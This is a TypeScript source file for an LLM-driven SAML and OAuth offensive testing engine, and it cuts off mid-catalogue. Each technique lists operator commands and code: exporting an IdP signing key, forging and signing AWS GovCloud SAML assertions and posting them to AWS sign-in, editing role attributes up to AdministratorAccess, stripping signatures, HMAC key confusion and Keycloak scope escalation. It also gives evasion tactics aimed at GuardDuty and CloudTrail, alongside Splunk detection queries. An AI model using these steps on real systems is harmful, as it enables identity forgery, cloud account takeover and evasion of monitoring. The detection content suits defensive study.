/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * SAML/IdP Offensive Testing Engine — Golden SAML & Identity Provider Attacks
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * LLM-driven offensive testing module for SAML 2.0, OAuth 2.0, and OIDC
 * identity federation chains. Targets the trust boundary between Identity
 * Providers (Google Workspace, Okta, Azure AD, Keycloak) and Service Providers
 * (AWS SSO/IAM Identity Center, custom applications).
 *
 * Attack Vectors Covered:
 *   T1606.002 — Forge Web Credentials: SAML Tokens (Golden SAML)
 *   T1550.001 — Use Alternate Authentication Material: Application Access Token
 *   T1556.007 — Modify Authentication Process: Hybrid Identity
 *   T1528     — Steal Application Access Token
 *   T1199     — Trusted Relationship (IdP → SP trust abuse)
 *
 * The LLM autonomously:
 *   - Analyzes target IdP/SP federation configuration for weaknesses
 *   - Selects optimal attack technique based on access level and target architecture
 *   - Generates step-by-step operator guidance for manual execution steps
 *   - Plans evasion strategies for FedRAMP/GovCloud detection stacks
 *   - Produces structured evidence records for the integrity chain
 *   - Maps each action to SOC-detectable indicators for blue team correlation
 *
 * Evasion Intelligence:
 *   - CloudTrail event minimization (avoid sts:AssumeRoleWithSAML noise patterns)
 *   - Token lifetime manipulation to avoid session anomaly detection
 *   - Assertion timing alignment with legitimate auth patterns
 *   - Certificate rotation awareness to avoid signature validation alerts
 *
 * Author: Harrison Cook — AceofCloud / AC3
 * Classification: PROPRIETARY — AC3 Internal Use Only
 */

import { invokeLLM } from "../_core/llm";

// ═══════════════════════════════════════════════════════════════════════════════
// §1 — TECHNIQUE KNOWLEDGE BASE
// ═══════════════════════════════════════════════════════════════════════════════

export interface SAMLOffensiveTechnique {
  id: string;
  name: string;
  attackId: string;
  category: "golden_saml" | "assertion_manipulation" | "signature_bypass" | "oauth_abuse" | "oidc_exploitation" | "federation_pivot";
  description: string;
  prerequisites: string[];
  targetIdPs: ("google_workspace" | "okta" | "azure_ad" | "keycloak" | "adfs" | "ping_identity" | "generic")[];
  targetSPs: ("aws_sso" | "aws_iam" | "azure" | "gcp" | "custom_app" | "generic")[];
  difficulty: "intermediate" | "advanced" | "expert";
  opsecRisk: number; // 1-10
  noiseLevel: "silent" | "low" | "moderate" | "loud";
  executionSteps: string[];
  operatorGuidance: OperatorStep[];
  evasionTechniques: EvasionTechnique[];
  detectionSignatures: DetectionSignature[];
  evidenceArtifacts: string[];
  references: string[];
}

export interface OperatorStep {
  stepNumber: number;
  action: string;
  command?: string;
  expectedOutput?: string;
  decisionPoint?: string;
  fallbackAction?: string;
  riskWarning?: string;
  automated: boolean;
}

export interface EvasionTechnique {
  id: string;
  name: string;
  description: string;
  targetDetection: string; // What detection system this evades
  implementation: string;
  effectiveness: "high" | "medium" | "low";
  tradeoff: string;
}

export interface DetectionSignature {
  source: "cloudtrail" | "guardduty" | "falco" | "wazuh" | "k8s_audit" | "siem" | "idp_logs" | "sp_logs";
  eventName: string;
  eventId?: string;
  description: string;
  query: string; // SIEM query (Splunk/Elastic format)
  severity: "critical" | "high" | "medium" | "low" | "info";
  falsePositiveRate: "high" | "medium" | "low";
  timeWindow: string; // How quickly SOC should detect this
}

export interface EvidenceRecord {
  techniqueId: string;
  techniqueName: string;
  mitreTechnique: string;
  timestamp: number;
  sourceIp: string;
  targetService: string;
  actionPerformed: string;
  commandExecuted?: string;
  rawOutput?: string;
  artifactsCollected: string[];
  detectionCorrelation: DetectionCorrelation[];
  operatorNotes?: string;
  success: boolean;
  accessAchieved?: string;
}

export interface DetectionCorrelation {
  logSource: string;
  eventName: string;
  expectedTimestamp: string; // Relative to action timestamp
  searchQuery: string;
  description: string;
}

// ─── Golden SAML Technique Catalog ──────────────────────────────────────────

export const SAML_OFFENSIVE_TECHNIQUES: SAMLOffensiveTechnique[] = [
  {
    id: "golden-saml-01",
    name: "Golden SAML — IdP Signing Key Extraction",
    attackId: "T1606.002",
    category: "golden_saml",
    description: "Extract the IdP's SAML token-signing certificate private key to forge arbitrary SAML assertions. With this key, an attacker can impersonate any user to any SP that trusts the IdP, bypassing MFA entirely since authentication occurs at the IdP level.",
    prerequisites: [
      "Administrative access to the IdP (Google Workspace Super Admin, Okta Admin, ADFS server, or Keycloak realm admin)",
      "Access to the token-signing certificate private key storage",
      "Knowledge of the SP entity IDs and assertion consumer service URLs",
    ],
    targetIdPs: ["google_workspace", "okta", "azure_ad", "keycloak", "adfs"],
    targetSPs: ["aws_sso", "aws_iam", "azure", "gcp", "custom_app"],
    difficulty: "expert",
    opsecRisk: 8,
    noiseLevel: "low",
    executionSteps: [
      "Enumerate IdP federation configuration and identify all trusted SPs",
      "Locate token-signing certificate private key in IdP key store",
      "Extract private key material (method varies by IdP)",
      "Identify target SP entity ID, ACS URL, and expected assertion attributes",
      "Forge SAML assertion with target user identity and required attributes",
      "Sign forged assertion with extracted private key",
      "Submit assertion to SP's ACS endpoint to obtain session",
      "Validate access and document evidence",
    ],
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate SAML federation metadata from the IdP",
        command: "curl -s https://<idp-domain>/.well-known/openid-configuration\ncurl -s https://<idp-domain>/saml/metadata",
        expectedOutput: "XML metadata document containing entityID, signing certificate (public), SSO endpoints, and NameID format",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Extract IdP signing certificate from metadata for analysis",
        command: "echo '<base64-cert>' | base64 -d | openssl x509 -inform DER -text -noout",
        expectedOutput: "Certificate details including issuer, validity, key algorithm (RSA-2048/4096 or ECDSA P-256), and serial number",
        automated: true,
      },
      {
        stepNumber: 3,
        action: "Access IdP admin console to locate private key storage",
        command: "# Google Workspace: Admin Console → Security → SSO with third-party IdP → Download certificate\n# Keycloak: Realm Settings → Keys → RSA-generated → Export private key\n# ADFS: certutil -exportPFX -p <password> my <thumbprint> adfs_signing.pfx\n# Okta: Admin → Security → Identity Providers → Signing Certificate",
        decisionPoint: "If IdP uses HSM-backed keys (FIPS 140-2 Level 3), direct extraction may not be possible. Pivot to assertion manipulation or session hijacking instead.",
        riskWarning: "Accessing the signing key store will generate admin audit logs in the IdP. Ensure you have legitimate admin access or have compromised an admin account.",
        automated: false,
      },
      {
        stepNumber: 4,
        action: "Forge SAML assertion targeting AWS IAM Identity Center",
        command: `python3 << 'EOF'
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
import base64, hashlib, uuid

# Assertion template for AWS SSO
assertion = f"""<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_{{uuid.uuid4().hex}}" IssueInstant="{{datetime.utcnow().isoformat()}}Z"
  Version="2.0">
  <saml2:Issuer>{{IDP_ENTITY_ID}}</saml2:Issuer>
  <saml2:Subject>
    <saml2:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">
      {{TARGET_USER_EMAIL}}
    </saml2:NameID>
    <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml2:SubjectConfirmationData
        NotOnOrAfter="{{(datetime.utcnow() + timedelta(minutes=5)).isoformat()}}Z"
        Recipient="{{SP_ACS_URL}}" />
    </saml2:SubjectConfirmation>
  </saml2:Subject>
  <saml2:Conditions NotBefore="{{datetime.utcnow().isoformat()}}Z"
    NotOnOrAfter="{{(datetime.utcnow() + timedelta(hours=1)).isoformat()}}Z">
    <saml2:AudienceRestriction>
      <saml2:Audience>{{SP_ENTITY_ID}}</saml2:Audience>
    </saml2:AudienceRestriction>
  </saml2:Conditions>
  <saml2:AuthnStatement AuthnInstant="{{datetime.utcnow().isoformat()}}Z"
    SessionIndex="_{{uuid.uuid4().hex}}">
    <saml2:AuthnContext>
      <saml2:AuthnContextClassRef>
        urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
      </saml2:AuthnContextClassRef>
    </saml2:AuthnContext>
  </saml2:AuthnStatement>
  <saml2:AttributeStatement>
    <saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/RoleSessionName">
      <saml2:AttributeValue>{{TARGET_USER_EMAIL}}</saml2:AttributeValue>
    </saml2:Attribute>
    <saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/Role">
      <saml2:AttributeValue>arn:aws-us-gov:iam::{{ACCOUNT_ID}}:role/{{ROLE_NAME}},arn:aws-us-gov:iam::{{ACCOUNT_ID}}:saml-provider/{{PROVIDER_NAME}}</saml2:AttributeValue>
    </saml2:Attribute>
    <saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/SessionDuration">
      <saml2:AttributeValue>3600</saml2:AttributeValue>
    </saml2:Attribute>
  </saml2:AttributeStatement>
</saml2:Assertion>"""
print(assertion)
EOF`,
        expectedOutput: "Unsigned SAML assertion XML with target user identity and AWS role attributes",
        automated: false,
      },
      {
        stepNumber: 5,
        action: "Sign the forged assertion with the extracted private key",
        command: `# Using xmlsec1 for XML digital signature
xmlsec1 --sign --privkey-pem extracted_signing_key.pem \\
  --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \\
  --output signed_assertion.xml forged_assertion.xml

# Or using Python signxml library:
python3 -c "
from signxml import XMLSigner
from lxml import etree
assertion = etree.parse('forged_assertion.xml').getroot()
key = open('extracted_signing_key.pem', 'rb').read()
signed = XMLSigner(method='enveloped', signature_algorithm='rsa-sha256', digest_algorithm='sha256').sign(assertion, key=key)
print(etree.tostring(signed, pretty_print=True).decode())
"`,
        riskWarning: "The signed assertion is a live credential. Handle with same security as a password. Destroy after use.",
        automated: false,
      },
      {
        stepNumber: 6,
        action: "Submit signed assertion to AWS SSO ACS endpoint",
        command: `# Base64-encode the signed assertion and POST to ACS
SAML_RESPONSE=$(base64 -w0 signed_assertion.xml)
curl -v -X POST "https://signin.aws.amazon.com/saml" \\
  -d "SAMLResponse=$SAML_RESPONSE&RelayState=" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -c aws_session_cookies.txt

# For AWS GovCloud:
curl -v -X POST "https://signin.amazonaws-us-gov.com/saml" \\
  -d "SAMLResponse=$SAML_RESPONSE&RelayState=" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -c aws_session_cookies.txt`,
        expectedOutput: "HTTP 302 redirect to AWS console with valid session cookies, or STS credentials in response",
        decisionPoint: "If the SP returns a signature validation error, verify: (1) correct signing algorithm, (2) certificate matches what SP has registered, (3) assertion timestamps are within clock skew tolerance",
        automated: false,
      },
      {
        stepNumber: 7,
        action: "Validate access and collect evidence",
        command: `# Verify identity
aws sts get-caller-identity --region us-gov-west-1

# Document access level
aws iam list-attached-role-policies --role-name <assumed-role> --region us-gov-west-1

# Screenshot console access as evidence
# Record: source IP, timestamp, assumed identity, permissions obtained`,
        expectedOutput: "JSON showing assumed role ARN, account ID, and user ID confirming successful Golden SAML attack",
        automated: true,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-saml-01",
        name: "Assertion Lifetime Alignment",
        description: "Set assertion NotOnOrAfter to match legitimate session durations (typically 1-8 hours for AWS SSO). Abnormally short or long sessions trigger anomaly detection.",
        targetDetection: "AWS IAM Identity Center session anomaly detection",
        implementation: "Set SessionDuration attribute to match the SP's configured maximum (check IAM Identity Center settings). Use 3600 (1 hour) as safe default for AWS GovCloud.",
        effectiveness: "high",
        tradeoff: "Limits operational window to the configured session duration",
      },
      {
        id: "ev-saml-02",
        name: "Clock Skew Exploitation",
        description: "Set IssueInstant slightly in the past (30-60 seconds) to account for network latency and avoid timestamp validation failures while appearing as a legitimate delayed assertion.",
        targetDetection: "SP timestamp validation and replay detection",
        implementation: "IssueInstant = now - 45 seconds. NotBefore = now - 120 seconds. NotOnOrAfter = now + configured_duration.",
        effectiveness: "high",
        tradeoff: "None — this mimics legitimate network latency",
      },
      {
        id: "ev-saml-03",
        name: "Legitimate User Impersonation Timing",
        description: "Execute Golden SAML during the target user's normal working hours and from a geographically plausible IP to avoid impossible travel alerts.",
        targetDetection: "GuardDuty UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration, CloudTrail Insights",
        implementation: "Research target user's login patterns via IdP logs (if accessible). Execute during their normal business hours. Use a VPN exit in their geographic region.",
        effectiveness: "medium",
        tradeoff: "Constrains operational timing; requires prior intelligence on user patterns",
      },
      {
        id: "ev-saml-04",
        name: "Read-Only API Preference",
        description: "After obtaining access via Golden SAML, prefer read-only API calls (Describe*, List*, Get*) over mutating calls to minimize CloudTrail write events and avoid GuardDuty findings.",
        targetDetection: "CloudTrail event volume anomaly, GuardDuty Recon findings",
        implementation: "Use aws sts get-caller-identity, aws iam list-roles, aws s3 ls rather than creating resources or modifying configurations. Batch read operations with 5-10 second delays.",
        effectiveness: "high",
        tradeoff: "Limits ability to demonstrate full impact (no data modification proof)",
      },
      {
        id: "ev-saml-05",
        name: "Avoid AssumeRoleWithSAML Chaining",
        description: "Do not immediately chain AssumeRole calls after the initial SAML authentication. GuardDuty specifically monitors for rapid role-chaining patterns from SAML-authenticated sessions.",
        targetDetection: "GuardDuty PrivilegeEscalation:IAMUser/AnomalousBehavior",
        implementation: "Wait minimum 5 minutes between initial SAML auth and any subsequent AssumeRole calls. Perform legitimate-looking read operations in between.",
        effectiveness: "medium",
        tradeoff: "Slows lateral movement through AWS accounts",
      },
      {
        id: "ev-saml-06",
        name: "Session Token Refresh Mimicry",
        description: "When the SAML session expires, re-authenticate with a new forged assertion rather than using STS token refresh. This mimics legitimate re-authentication patterns.",
        targetDetection: "CloudTrail session duration anomaly detection",
        implementation: "Generate new assertion with fresh timestamps every 55 minutes (before 1-hour expiry). Each assertion should have a unique ID and SessionIndex.",
        effectiveness: "high",
        tradeoff: "Requires maintaining access to signing key for duration of operation",
      },
    ],
    detectionSignatures: [
      {
        source: "cloudtrail",
        eventName: "AssumeRoleWithSAML",
        description: "AWS CloudTrail logs every SAML-based role assumption. The forged assertion will generate this event with the attacker's source IP.",
        query: `index=cloudtrail eventName="AssumeRoleWithSAML" | stats count by sourceIPAddress, userIdentity.arn, requestParameters.roleArn | where count > 1`,
        severity: "high",
        falsePositiveRate: "high",
        timeWindow: "Real-time (CloudTrail delivers within 5-15 minutes)",
      },
      {
        source: "cloudtrail",
        eventName: "ConsoleLogin (SAML)",
        description: "Console login via SAML federation. Compare source IP against known user locations.",
        query: `index=cloudtrail eventName="ConsoleLogin" additionalEventData.SamlProviderArn=* | eval src_geo=iplocation(sourceIPAddress) | where src_geo != expected_geo`,
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "Real-time",
      },
      {
        source: "guardduty",
        eventName: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
        description: "GuardDuty detects when IAM credentials obtained within AWS are used from an external IP. May trigger if Golden SAML session is used from non-AWS IP.",
        query: `index=guardduty type="UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "15-30 minutes",
      },
      {
        source: "idp_logs",
        eventName: "SAML Assertion Issued (without corresponding AuthN)",
        description: "If the IdP logs show a SAML assertion was consumed by an SP but no corresponding authentication event exists at the IdP, this indicates a forged assertion.",
        query: `index=google_workspace_admin event_type="saml_response" NOT (event_type="login_success" within 60s) | table timestamp, user, sp_entity_id`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Requires log correlation — typically 1-4 hours for SOC to identify",
      },
      {
        source: "siem",
        eventName: "Impossible Travel — SAML Session",
        description: "SAML-authenticated session from a geographic location inconsistent with the user's recent login history.",
        query: `| tstats count where index=cloudtrail eventName="AssumeRoleWithSAML" by sourceIPAddress, _time, userIdentity.principalId | iplocation sourceIPAddress | transaction userIdentity.principalId maxspan=2h | where mvcount(City) > 1`,
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "1-2 hours (depends on SIEM correlation rules)",
      },
      {
        source: "sp_logs",
        eventName: "SAML Assertion Replay Detected",
        description: "SP detects a SAML assertion ID that has been seen before (replay attack). Well-configured SPs maintain an assertion ID cache.",
        query: `index=app_logs "SAML assertion replay" OR "duplicate assertion ID" | table timestamp, assertion_id, source_ip`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Immediate (if SP has replay detection)",
      },
    ],
    evidenceArtifacts: [
      "IdP metadata XML (public — shows federation configuration)",
      "Forged assertion XML (sanitized — shows technique execution)",
      "Signed assertion (hash only — do not store actual signed token)",
      "AWS STS get-caller-identity output (proves successful impersonation)",
      "CloudTrail AssumeRoleWithSAML event (from target account)",
      "Screenshot of AWS console access under impersonated identity",
      "IAM policy listing showing permissions obtained",
    ],
    references: [
      "https://attack.mitre.org/techniques/T1606/002/",
      "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps",
      "https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452",
      "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_saml.html",
    ],
  },
  {
    id: "saml-manipulation-01",
    name: "SAML Assertion Attribute Manipulation",
    attackId: "T1606.002",
    category: "assertion_manipulation",
    description: "Intercept and modify SAML assertion attributes in transit (if assertion is not signed or signature is not validated) to escalate privileges. Modify role attributes, group memberships, or session duration to gain unauthorized access levels.",
    prerequisites: [
      "Man-in-the-middle position or access to assertion before SP validation",
      "SP does not validate assertion signature, or uses weak signature validation",
      "Knowledge of SP's expected attribute names and valid values",
    ],
    targetIdPs: ["generic"],
    targetSPs: ["aws_sso", "aws_iam", "custom_app", "generic"],
    difficulty: "intermediate",
    opsecRisk: 5,
    noiseLevel: "silent",
    executionSteps: [
      "Intercept SAML response (via browser proxy or compromised relay)",
      "Decode Base64 SAML response to extract assertion XML",
      "Identify role/group/permission attributes in the assertion",
      "Modify attribute values to escalate privileges",
      "Re-encode assertion (strip signature if present and SP doesn't enforce)",
      "Forward modified assertion to SP ACS endpoint",
      "Validate escalated access",
    ],
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Configure browser proxy to intercept SAML POST",
        command: "# In Burp Suite: Intercept → SAML response at ACS endpoint\n# Look for POST to /saml/acs or /api/saml/callback\n# SAMLResponse parameter contains Base64-encoded XML",
        automated: false,
      },
      {
        stepNumber: 2,
        action: "Decode and analyze the SAML assertion",
        command: `echo "$SAML_RESPONSE" | base64 -d | xmllint --format - | tee decoded_assertion.xml`,
        expectedOutput: "Formatted XML showing Issuer, Subject, Conditions, AttributeStatement with role/group attributes",
        automated: true,
      },
      {
        stepNumber: 3,
        action: "Modify role attribute to escalate privileges",
        command: `# For AWS: Change the Role attribute to a higher-privilege role
sed -i 's|arn:aws-us-gov:iam::ACCOUNT:role/ReadOnly|arn:aws-us-gov:iam::ACCOUNT:role/AdministratorAccess|g' decoded_assertion.xml

# For custom apps: Change group membership
sed -i 's|<saml2:AttributeValue>users</saml2:AttributeValue>|<saml2:AttributeValue>admins</saml2:AttributeValue>|g' decoded_assertion.xml`,
        decisionPoint: "Check if the assertion has an XML signature. If signed, test whether SP validates it (some SPs accept unsigned assertions or don't verify signature).",
        automated: false,
      },
      {
        stepNumber: 4,
        action: "Test signature validation bypass",
        command: `# Method 1: Remove signature entirely
xmlstarlet ed -d "//*[local-name()='Signature']" decoded_assertion.xml > unsigned_assertion.xml

# Method 2: XML Signature Wrapping (XSW) — move original signed assertion, inject modified copy
# Method 3: Comment injection in NameID to bypass string matching
# Method 4: XSLT transformation injection`,
        riskWarning: "If SP properly validates signatures, these methods will fail and may generate security alerts.",
        automated: false,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-manip-01",
        name: "Signature Stripping",
        description: "Remove the XML digital signature from the assertion. Many SPs are configured to 'want' signatures but don't enforce them.",
        targetDetection: "SP signature validation logging",
        implementation: "Remove the entire <ds:Signature> element from the assertion XML before re-encoding.",
        effectiveness: "medium",
        tradeoff: "Only works against misconfigured SPs that don't enforce signature validation",
      },
      {
        id: "ev-manip-02",
        name: "XML Signature Wrapping (XSW)",
        description: "Exploit XML canonicalization to inject a modified assertion while keeping the original signed assertion intact. The SP validates the signature on the original but processes the injected copy.",
        targetDetection: "Advanced SAML security scanners, WAF XML inspection",
        implementation: "Clone the signed assertion, modify the clone's attributes, place the original in a non-processed location (e.g., Extensions element), and ensure the SP's XPath resolves to the modified copy.",
        effectiveness: "high",
        tradeoff: "Complex to implement correctly; requires understanding of SP's XML processing",
      },
    ],
    detectionSignatures: [
      {
        source: "sp_logs",
        eventName: "SAML Signature Validation Failure",
        description: "SP logs a signature validation failure when receiving a modified or unsigned assertion.",
        query: `index=app_logs ("signature validation failed" OR "invalid SAML signature" OR "assertion not signed") | table timestamp, source_ip, user_attempted`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Immediate",
      },
      {
        source: "siem",
        eventName: "Privilege Escalation via SAML Attribute Change",
        description: "User's role/permissions change without corresponding admin action in the IdP.",
        query: `index=app_logs event_type="saml_login" | transaction user maxspan=1h | where role != prev_role AND NOT (index=idp_admin "role_change")`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Requires correlation — 1-4 hours",
      },
    ],
    evidenceArtifacts: [
      "Original intercepted SAML assertion (Base64 decoded)",
      "Modified assertion showing attribute changes",
      "SP response showing accepted/rejected status",
      "Access level before and after manipulation",
    ],
    references: [
      "https://attack.mitre.org/techniques/T1606/002/",
      "https://research.nccgroup.com/2021/03/29/saml-xml-injection/",
      "https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky",
    ],
  },
  {
    id: "saml-algo-confusion-01",
    name: "SAML Signature Algorithm Confusion",
    attackId: "T1606.002",
    category: "signature_bypass",
    description: "Exploit signature algorithm confusion vulnerabilities where the SP accepts weaker algorithms than intended. Downgrade from RSA-SHA256 to RSA-SHA1, or exploit HMAC confusion where the SP's public key is used as an HMAC secret.",
    prerequisites: [
      "SP accepts multiple signature algorithms",
      "SP does not enforce minimum algorithm strength",
      "Access to SP's public certificate (always available in metadata)",
    ],
    targetIdPs: ["generic"],
    targetSPs: ["custom_app", "generic"],
    difficulty: "advanced",
    opsecRisk: 4,
    noiseLevel: "silent",
    executionSteps: [
      "Obtain SP's public certificate from metadata endpoint",
      "Test whether SP accepts HMAC-SHA256 signatures (key confusion attack)",
      "If HMAC works: sign assertion using SP's public key as HMAC secret",
      "If HMAC fails: test SHA-1 downgrade (RSA-SHA1 instead of RSA-SHA256)",
      "Submit assertion with weaker/confused signature",
    ],
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Extract SP public certificate from metadata",
        command: `curl -s https://<sp-domain>/saml/metadata | xmlstarlet sel -t -v "//ds:X509Certificate" | base64 -d > sp_public.der
openssl x509 -inform DER -in sp_public.der -pubkey -noout > sp_public.pem`,
        expectedOutput: "PEM-formatted public key file",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Attempt HMAC key confusion — sign with public key as HMAC secret",
        command: `python3 << 'EOF'
from signxml import XMLSigner
from lxml import etree

# Load the forged assertion
assertion = etree.parse('forged_assertion.xml').getroot()

# Use SP's public key as HMAC secret (key confusion vulnerability)
sp_public_key = open('sp_public.pem', 'rb').read()

try:
    # Sign with HMAC-SHA256 using the public key as the secret
    signer = XMLSigner(
        method='enveloped',
        signature_algorithm='hmac-sha256',
        digest_algorithm='sha256'
    )
    signed = signer.sign(assertion, key=sp_public_key)
    print("[+] HMAC key confusion signature generated successfully")
    with open('hmac_signed_assertion.xml', 'wb') as f:
        f.write(etree.tostring(signed))
except Exception as e:
    print(f"[-] HMAC signing failed: {e}")
EOF`,
        decisionPoint: "If HMAC confusion works, this is a critical finding (CVE-level). If it fails, proceed to algorithm downgrade testing.",
        automated: false,
      },
      {
        stepNumber: 3,
        action: "Test SHA-1 algorithm downgrade",
        command: `# Sign with RSA-SHA1 instead of RSA-SHA256
xmlsec1 --sign --privkey-pem attacker_key.pem \\
  --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \\
  --sign-algorithm rsa-sha1 \\
  --output sha1_signed_assertion.xml forged_assertion.xml`,
        riskWarning: "SHA-1 is deprecated but many legacy SPs still accept it. This is a compliance finding even if exploitation fails.",
        automated: false,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-algo-01",
        name: "Algorithm Downgrade Stealth",
        description: "SHA-1 signed assertions may not trigger alerts because many legacy systems still use SHA-1 legitimately.",
        targetDetection: "WAF/IDS XML signature inspection",
        implementation: "Use RSA-SHA1 which is technically valid per the SAML spec even though it's deprecated.",
        effectiveness: "high",
        tradeoff: "Only works against SPs that accept SHA-1 (decreasing over time)",
      },
    ],
    detectionSignatures: [
      {
        source: "sp_logs",
        eventName: "Weak Signature Algorithm Used",
        description: "SP receives assertion signed with deprecated algorithm (SHA-1 or HMAC).",
        query: `index=app_logs "signature algorithm" ("sha1" OR "hmac" OR "SHA-1" OR "HMAC-SHA256") event_type="saml_validation"`,
        severity: "high",
        falsePositiveRate: "low",
        timeWindow: "Immediate",
      },
    ],
    evidenceArtifacts: [
      "SP metadata showing accepted algorithms",
      "Forged assertion with weak/confused signature",
      "SP response showing acceptance or rejection",
      "Algorithm configuration analysis",
    ],
    references: [
      "https://www.kb.cert.org/vuls/id/475445",
      "https://nvd.nist.gov/vuln/detail/CVE-2017-11427",
    ],
  },
  {
    id: "oauth-scope-escalation-01",
    name: "OAuth 2.0 Scope Escalation via Keycloak OIDC",
    attackId: "T1528",
    category: "oauth_abuse",
    description: "Exploit Keycloak OIDC proxy misconfigurations to escalate OAuth token scopes beyond what was authorized. Target the Keycloak realm's client scope mappings to obtain tokens with elevated permissions.",
    prerequisites: [
      "Valid OAuth client credentials or authorization code",
      "Keycloak realm accessible (typically via WireGuard VPN in Stell's environment)",
      "Knowledge of available scopes and client configurations",
    ],
    targetIdPs: ["keycloak"],
    targetSPs: ["aws_sso", "custom_app"],
    difficulty: "intermediate",
    opsecRisk: 5,
    noiseLevel: "low",
    executionSteps: [
      "Enumerate Keycloak realm configuration and available clients",
      "Identify client scope mappings and optional scopes",
      "Request token with additional scopes not in original authorization",
      "Test token exchange endpoint for scope escalation",
      "Attempt client_credentials grant with elevated scopes",
      "Validate escalated access against target services",
    ],
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate Keycloak realm configuration",
        command: `# Get realm OpenID configuration
curl -s https://<keycloak-host>/realms/<realm>/.well-known/openid-configuration | jq .

# Get realm public keys
curl -s https://<keycloak-host>/realms/<realm>/protocol/openid-connect/certs | jq .

# If admin access available:
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \\
  https://<keycloak-host>/admin/realms/<realm>/clients | jq '.[].clientId'`,
        expectedOutput: "JSON with token endpoint, authorization endpoint, supported scopes, and grant types",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Request token with escalated scopes",
        command: `# Attempt to add scopes not in original authorization
curl -X POST https://<keycloak-host>/realms/<realm>/protocol/openid-connect/token \\
  -d "grant_type=authorization_code" \\
  -d "code=$AUTH_CODE" \\
  -d "client_id=$CLIENT_ID" \\
  -d "client_secret=$CLIENT_SECRET" \\
  -d "scope=openid profile email admin aws-govcloud-admin" \\
  -d "redirect_uri=$REDIRECT_URI"

# Test token exchange for scope escalation
curl -X POST https://<keycloak-host>/realms/<realm>/protocol/openid-connect/token \\
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \\
  -d "subject_token=$CURRENT_TOKEN" \\
  -d "subject_token_type=urn:ietf:params:oauth:token-type:access_token" \\
  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \\
  -d "scope=admin" \\
  -d "client_id=$CLIENT_ID" \\
  -d "client_secret=$CLIENT_SECRET"`,
        decisionPoint: "If scope escalation succeeds, decode the JWT to verify additional claims. If it fails with 'invalid_scope', the Keycloak client is properly configured.",
        automated: false,
      },
      {
        stepNumber: 3,
        action: "Decode and analyze obtained tokens",
        command: `# Decode JWT without verification to inspect claims
echo "$ACCESS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Check for: realm_access.roles, resource_access, scope, aud claims
# Look for: admin roles, aws-account-* roles, elevated permissions`,
        expectedOutput: "JWT payload showing roles, scopes, and audience claims",
        automated: true,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-oauth-01",
        name: "Legitimate Client Impersonation",
        description: "Use a legitimate client_id that already has the elevated scopes configured. This makes the token request appear normal in Keycloak audit logs.",
        targetDetection: "Keycloak event logs, SIEM OAuth monitoring",
        implementation: "Enumerate clients with admin scopes via Keycloak admin API or realm export. Use that client's credentials for the token request.",
        effectiveness: "high",
        tradeoff: "Requires access to a privileged client's credentials",
      },
      {
        id: "ev-oauth-02",
        name: "Token Refresh Scope Injection",
        description: "During token refresh, attempt to add scopes that weren't in the original authorization. Some implementations don't re-validate scopes on refresh.",
        targetDetection: "Keycloak token refresh audit events",
        implementation: "Obtain a valid refresh token, then request refresh with additional scope parameter.",
        effectiveness: "medium",
        tradeoff: "Only works against misconfigured Keycloak realms that don't enforce scope on refresh",
      },
    ],
    detectionSignatures: [
      {
        source: "idp_logs",
        eventName: "TOKEN_EXCHANGE or SCOPE_ESCALATION",
        description: "Keycloak logs token exchange events and scope changes. Unusual scope requests trigger audit events.",
        query: `index=keycloak_events type="TOKEN_EXCHANGE" OR (type="CODE_TO_TOKEN" scope!="openid profile email") | table timestamp, clientId, userId, scope, ipAddress`,
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "Real-time (Keycloak event listener)",
      },
      {
        source: "siem",
        eventName: "OAuth Token with Unexpected Scopes",
        description: "Application receives a token with scopes that the user/client shouldn't have based on RBAC configuration.",
        query: `index=app_logs event_type="token_validation" | where scope_count > expected_scope_count OR scope LIKE "%admin%"`,
        severity: "high",
        falsePositiveRate: "low",
        timeWindow: "Immediate upon token use",
      },
    ],
    evidenceArtifacts: [
      "Keycloak realm configuration (sanitized)",
